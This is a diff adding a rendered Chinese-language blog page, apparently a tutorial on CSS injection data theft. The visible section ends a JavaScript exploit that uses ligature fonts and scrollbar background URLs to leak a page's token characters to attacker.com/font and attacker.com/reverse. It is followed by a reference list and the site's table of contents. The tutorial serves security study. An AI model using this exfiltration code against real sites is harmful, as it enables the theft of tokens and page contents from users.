+                <span class="token keyword">await</span> Promise<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">createAttackIframe</span><span class="token punctuation">(</span>leftChars<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">createAttackIframe</span><span class="token punctuation">(</span>rightChars<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                
+                <span class="token comment">// 等待返回的字符</span>
+                <span class="token keyword">const</span> chars <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">getCharsFromReverseConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                
+                <span class="token comment">// 在此基础上我们继续“分而治之”。</span>
+                alphabet <span class="token operator">=</span> chars<span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+            <span class="token comment">//如果我们在这里，那就意味着字母表有一个字符。</span>
+            <span class="token comment">//结论：这个字符是另一个 token 字符</span>
+            
+            <span class="token keyword">return</span> alphabet<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        
+        <span class="token keyword">function</span> <span class="token function">clearAllCookies</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>Cookies<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">cookie</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+                Cookies<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        
+        <span class="token keyword">function</span> <span class="token function">deleteAllIframes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">iframe</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+                iframe<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        
+        <span class="token comment">// 该函数将字符串分成两个长度相同（或相差一）的字符串。例如 split("abcd") == ["ab", "cd"];</span>
+        <span class="token keyword">function</span> <span class="token function">split</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">const</span> halfLength <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>length <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> <span class="token punctuation">[</span>s<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> halfLength<span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>halfLength<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        
+        <span class="token comment">// 生成随机字符串的函数，例如 randomValue() == "rand6226966173982633"</span>
+        <span class="token keyword">function</span> <span class="token function">randomValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token string">"rand"</span> <span class="token operator">+</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        
+        <span class="token comment">//我们生成 CSS，这将确保字体位于缓存中。</span>
+        <span class="token comment">//作为字体已经下载的证明，我们将使用以下检查</span>
+        <span class="token comment">//是否定义了 font_$&#123;random_track_characters&#125; cookie。</span>
+        <span class="token keyword">function</span> <span class="token function">makeSureFontsAreCached</span><span class="token punctuation">(</span><span class="token parameter">leftChars<span class="token punctuation">,</span> rightChars</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+                <span class="token comment">// 我们对所有值进行编码，以便能够将它们安全地放置在 URL 中。</span>
+                <span class="token keyword">let</span> encodedPrefix<span class="token punctuation">;</span>
+                <span class="token punctuation">[</span>encodedPrefix<span class="token punctuation">,</span> leftChars<span class="token punctuation">,</span> rightChars<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>prefix<span class="token punctuation">,</span> leftChars<span class="token punctuation">,</span> rightChars<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">val</span> <span class="token operator">=></span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            
+                <span class="token comment">// 我们生成引用这两种字体的 CSS。使用 body:before 和 body:after 以确保浏览器必须下载这两种字体。</span>
+                <span class="token keyword">const</span> css <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+                    @font-face &#123;
+                        font-family: 'hack1';
+                        src: url(http://attacker.com/font/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>encodedPrefix<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>leftChars<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">)
+                    &#125;
+                    @font-face &#123;
+                        font-family: 'hack2';
+                        src: url(http://attacker.com/font/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>encodedPrefix<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>rightChars<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">)
+                    &#125;
+                    body:before &#123;
+                        content: 'x';
+                        font-family: 'hack1';
+                    &#125;
+                    body:after &#123;
+                        content: 'x';
+                        font-family: 'hack2';
+                    &#125;
+                </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
+                
+                <span class="token comment">// 创建一个将加载字体的 iframe</span>
+                <span class="token keyword">const</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                iframe<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+                    <span class="token comment">// 该函数直到发生事件才会结束</span>
+                    <span class="token comment">// iframe 元素中的 onload 被触发</span>
+                    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+                iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'http://localhost:12345/?css='</span> <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>css<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span>
+        
+        <span class="token comment">// 当这个函数被调用时，我们可以确定字体都在缓存中。</span>
+        <span class="token comment">// 所以让我们尝试用这样的风格来攻击，因为如果你点击这些字符，就会在 token 中出现一个滚动条</span>
+        <span class="token keyword">function</span> <span class="token function">createAttackIframe</span><span class="token punctuation">(</span><span class="token parameter">chars</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+                <span class="token comment">// 我们对所有值进行编码，以便能够将它们安全地放置在 URL 中。</span>
+                <span class="token keyword">let</span> encodedPrefix<span class="token punctuation">;</span>
+                <span class="token punctuation">[</span>encodedPrefix<span class="token punctuation">,</span> chars<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>prefix<span class="token punctuation">,</span> chars<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">val</span> <span class="token operator">=></span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            
+                <span class="token keyword">const</span> css <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+                @font-face &#123;
+                    font-family: "hack";
+                    src: url(http://attacker.com/font/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>encodedPrefix<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>chars<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">)
+                &#125;
+                script &#123;
+                    display: table;
+                    font-family: "hack";
+                    white-space: nowrap;
+                &#125;
+                body::-webkit-scrollbar &#123;
+                    background: blue;
+                &#125;
+                body::-webkit-scrollbar:horizontal &#123;
+                    background: blue url(http://attacker.com/reverse/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>chars<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">);
+                &#125;
+                </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
+            
+                <span class="token keyword">const</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                iframe<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+                    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+                iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'http://localhost:12345/?css='</span> <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>css<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token comment">// 该 iframe 必须相对较窄 - 滚动条才会出现。</span>
+                iframe<span class="token punctuation">.</span>style<span class="token punctuation">.</span>width <span class="token operator">=</span> <span class="token string">"40px"</span><span class="token punctuation">;</span>
+                document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>   
+        <span class="token punctuation">&#125;</span>
+        
+        <span class="token comment">// 每 20 毫秒检查一次，看看是否生成了通过滚动条产生了返回请求。如果是这样，我们就从字符 cookie 返回值。</span>
+        <span class="token keyword">function</span> <span class="token function">getCharsFromReverseConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">const</span> interval <span class="token operator">=</span> <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+                    <span class="token keyword">const</span> chars <span class="token operator">=</span> Cookies<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'chars'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span>chars<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                        <span class="token function">clearInterval</span><span class="token punctuation">(</span>interval<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token function">resolve</span><span class="token punctuation">(</span>chars<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">&#125;</span>
+                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span>
+        
+        <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">delay</span><span class="token punctuation">(</span><span class="token parameter">time</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+                <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> time<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span>
+        
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre>
+<h2 id="10-参考来源"><a href="#10-参考来源" class="headerlink" title="10. 参考来源"></a>10. 参考来源</h2><p>[1] <a href="https://xsleaks.dev/docs/attacks/css-injection/">CSS Injection</a><br>[2] <a href="https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d">Exfiltration via CSS Injection.</a> by d0nut<br>[3] <a href="https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b">Better Exfiltration via HTML Injection</a> by d0nut<br>[4] <a href="https://x-c3ll.github.io/posts/CSS-Injection-Primitives">CSS Injection Primitives</a> by TheXC3LL<br>[5] <a href="https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail">Code Vulnerabilities Put Proton Mails at Risk</a> by Paul Gerstex<br>[6] <a href="https://www.youtube.com/watch?v=pnbZMvCPqSc">Stealing With Style: Using CSS to Exploit ProtonMail &amp; Friends - Black Hat Asia 2023</a> by Paul Gerste<br>[7] <a href="https://css-tricks.com/child-and-sibling-selectors/">child-and-sibling-selectors</a><br>[8] <a href="https://github.com/d0nutptr/sic">Sequential Import Chaining - GitHub</a><br>[9] <a href="https://blog.huli.tw/2022/09/29/css-injection-1/">用 CSS 來偷資料 - CSS injection（上）</a> by Huli<br>[10] <a href="https://caniuse.com/css-has">:has() CSS relational pseudo-class</a><br>[11] <a href="https://blog.huli.tw/2022/09/29/css-injection-2/">用 CSS 來偷資料 - CSS injection（下）</a> by Huli<br>[12] <a href="https://blog.huli.tw/2023/12/11/0ctf-2023-writeup/">0CTF 2023 筆記</a> by Huli<br>[13] <a href="https://github.com/salvatore-abello/CTF-Writeups/blob/main/0ctf%20-%202023/newdiary/README.md">salvatore-abello&#x2F;CTF-Writeups&#x2F;0ctf - 2023&#x2F;newdiary - GitHub</a><br>[14] <a href="https://research.securitum.com/stealing-data-in-great-style-how-to-use-css-to-attack-web-application/">Stealing Data in Great style – How to Use CSS to Attack Web Application.</a> by MICHAŁ BENTKOWSKI </p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="../../write-up/2023-tuctf-writeup/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="../../write-up/2023-%E5%BC%BA%E7%BD%91%E6%9D%AFs7-writeup/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95"><span class="toc-text">1. 基础用法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%87%8F%E5%B0%91%E8%A7%84%E5%88%99%E6%95%B0%E9%87%8F"><span class="toc-text">2. 减少规则数量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%8A%A0%E9%80%9F%E6%B3%84%E9%9C%B2"><span class="toc-text">3. 加速泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-meta-%E6%A0%87%E7%AD%BE-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">4. meta 标签 信息泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E7%BB%95%E8%BF%87-type-hidden-%E5%B1%9E%E6%80%A7%E9%99%90%E5%88%B6"><span class="toc-text">5. 绕过 type&#x3D;hidden 属性限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-CSS-%E7%9B%B8%E9%82%BB%E5%90%8C%E7%BA%A7%E7%BB%84%E5%90%88%E5%99%A8%EF%BC%88-%EF%BC%89"><span class="toc-text">5.1 CSS 相邻同级组合器（+）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-CSS-%E9%80%9A%E7%94%A8%E5%90%8C%E7%BA%A7%E7%BB%84%E5%90%88%E5%99%A8%EF%BC%88-%EF%BC%89"><span class="toc-text">5.2 CSS 通用同级组合器（~）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-CSS-has-%E9%80%89%E6%8B%A9%E5%99%A8"><span class="toc-text">5.3 CSS :has 选择器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E5%AE%9E%E6%97%B6%E6%9B%B4%E6%96%B0-Style-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">6. 实时更新 Style 信息泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-%E6%AD%A5%E9%AA%A4"><span class="toc-text">6.1 步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-Payload"><span class="toc-text">6.2 Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-import-%E9%80%92%E5%BD%92%E5%AF%BC%E5%85%A5"><span class="toc-text">7. @import 递归导入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-import-%E7%94%A8%E6%B3%95"><span class="toc-text">7.1 @import 用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2-%E9%80%92%E5%BD%92%E5%AF%BC%E5%85%A5%E7%9A%84%E5%85%88%E5%86%B3%E6%9D%A1%E4%BB%B6"><span class="toc-text">7.2 递归导入的先决条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-3-%E9%80%92%E5%BD%92%E5%AF%BC%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-text">7.3 递归导入原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-4-%E9%80%92%E5%BD%92%E5%AF%BC%E5%85%A5%E7%A4%BA%E4%BE%8B"><span class="toc-text">7.4 递归导入示例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#7-4-1-%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7%E7%A4%BA%E4%BE%8B"><span class="toc-text">7.4.1 有效载荷示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-4-2-%E6%AD%A5%E9%AA%A4%E7%A4%BA%E4%BE%8B"><span class="toc-text">7.4.2 步骤示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-4-3-%E9%95%BF%E8%BD%AE%E8%AF%A2%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD%EF%BC%88%E7%AC%AC0%E4%BD%8D%EF%BC%89%E7%A4%BA%E4%BE%8B"><span class="toc-text">7.4.3 长轮询有效负载（第0位）示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-4-4-%E9%95%BF%E8%BD%AE%E8%AF%A2%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD%EF%BC%88%E7%AC%AC-1-s-%E4%BD%8D%EF%BC%89%E7%A4%BA%E4%BE%8B"><span class="toc-text">7.4.4 长轮询有效负载（第 1-s 位）示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-5-%E9%80%92%E5%BD%92%E5%AF%BC%E5%85%A5%E5%B7%A5%E5%85%B7"><span class="toc-text">7.5 递归导入工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-6-%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-text">7.6 注意事项</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#7-6-1-%E8%AF%B7%E6%B1%82%E6%95%B0%E9%87%8F%E9%99%90%E5%88%B6%E9%97%AE%E9%A2%98"><span class="toc-text">7.6.1 请求数量限制问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-6-2-Firefox-%E7%89%B9%E6%AE%8A%E5%A4%84%E7%90%86"><span class="toc-text">7.6.2 Firefox 特殊处理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E5%B9%B6%E8%A1%8C%E6%B3%84%E9%9C%B2%E7%BB%84%E5%90%88"><span class="toc-text">8. 并行泄露组合</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-1-nonce-%E5%88%87%E5%89%B2"><span class="toc-text">8.1 nonce 切割</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-2-%E8%A7%A3%E5%86%B3%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E9%97%AE%E9%A2%98"><span class="toc-text">8.2 解决属性覆盖问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#8-2-1-%E5%88%A9%E7%94%A8-cross-fade-%E5%87%BD%E6%95%B0"><span class="toc-text">8.2.1 利用 cross-fade() 函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-2-2-%E4%BD%BF%E7%94%A8-var-%E5%8F%98%E9%87%8F%E6%B3%95"><span class="toc-text">8.2.2 使用 var 变量法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3-nonce-%E5%A4%8D%E5%8E%9F"><span class="toc-text">8.3 nonce 复原</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#8-3-1-%E5%A4%8D%E5%8E%9F%E5%8E%9F%E7%90%86"><span class="toc-text">8.3.1 复原原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-3-2-JavaScript-%E5%AE%9E%E7%8E%B0"><span class="toc-text">8.3.2 JavaScript 实现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-3-3-Python-%E5%AE%9E%E7%8E%B0"><span class="toc-text">8.3.3 Python 实现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-%E9%A1%B5%E9%9D%A2%E5%86%85%E5%AE%B9%E6%B3%84%E9%9C%B2"><span class="toc-text">9. 页面内容泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#9-1-unicode-range"><span class="toc-text">9.1 unicode-range</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-2-%E5%AD%97%E4%BD%93%E9%AB%98%E5%BA%A6%E5%B7%AE%E5%BC%82-first-line-scrollbar"><span class="toc-text">9.2 字体高度差异 + first-line + scrollbar</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#9-2-1-%E5%AD%97%E5%85%83%E9%A1%BA%E5%BA%8F%E9%97%AE%E9%A2%98"><span class="toc-text">9.2.1 字元顺序问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-2-2-%E6%AD%A5%E9%AA%A4"><span class="toc-text">9.2.2 步骤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-2-3-%E5%B1%80%E9%99%90%E6%80%A7"><span class="toc-text">9.2.3 局限性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-3-%E8%BF%9E%E5%AD%97-scrollbar"><span class="toc-text">9.3 连字 + scrollbar</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#9-3-1-%E8%BF%9E%E5%AD%97"><span class="toc-text">9.3.1 连字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-3-2-%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95"><span class="toc-text">9.3.2 实现方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-3-3-%E6%AD%A5%E9%AA%A4"><span class="toc-text">9.3.3 步骤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-3-4-%E6%B3%84%E9%9C%B2-JavaScript-%E4%BB%A3%E7%A0%81"><span class="toc-text">9.3.4 泄露 JavaScript 代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-3-5-%E5%AD%97%E4%BD%93%E7%9A%84%E4%BA%A7%E7%94%9F"><span class="toc-text">9.3.5 字体的产生</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-%E5%8F%82%E8%80%83%E6%9D%A5%E6%BA%90"><span class="toc-text">10. 参考来源</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="../../js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" href="https://github.com/security-s3ven">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://github.com/security-s3ven">Copyright © 2025 s3ven</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="../../js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
